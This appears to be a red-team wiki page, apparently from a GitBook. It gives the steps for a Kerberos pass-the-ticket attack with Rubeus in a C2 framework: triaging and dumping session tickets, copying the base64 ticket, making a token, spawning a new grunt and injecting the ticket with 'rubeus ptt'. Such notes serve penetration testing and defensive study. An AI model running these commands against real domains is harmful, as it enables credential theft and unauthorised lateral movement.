# Rubeus

## Rubeus

### Pass the Ticket

#### - Show all session tickets

```text
Rubeus triage
```

![](../../../../.gitbook/assets/image%20%283%29.png)

#### - Dump the tickets

```text
Rubeus dump
```

![](../../../../.gitbook/assets/image%20%28103%29.png)

#### Loot are available in Data pane:

![](../../../../.gitbook/assets/image%20%28275%29.png)

#### Copy the base64 ticket \(bug from data interface, copy the interactive window\)

![](../../../../.gitbook/assets/image%20%28311%29.png)

#### Create a new session using MakeToken

```text
MakeToken help

[!] Usage: MakeToken <username> <domain> <password>[ <logontype> ]
```

![](../../../../.gitbook/assets/image%20%28272%29.png)

#### Create a new grunt session 

```text
CreateProcessWithToken

[!] Usage: CreateProcessWithToken <command>[ <path> ]
```

![](../../../../.gitbook/assets/image%20%28101%29.png)

#### Pass the ticket

```text
rubeus ptt /ticket:
```

![](../../../../.gitbook/assets/image%20%28260%29.png)

![](../../../../.gitbook/assets/image.png)

#### cifs ticket injected 

![](../../../../.gitbook/assets/image%20%28126%29.png)

### 

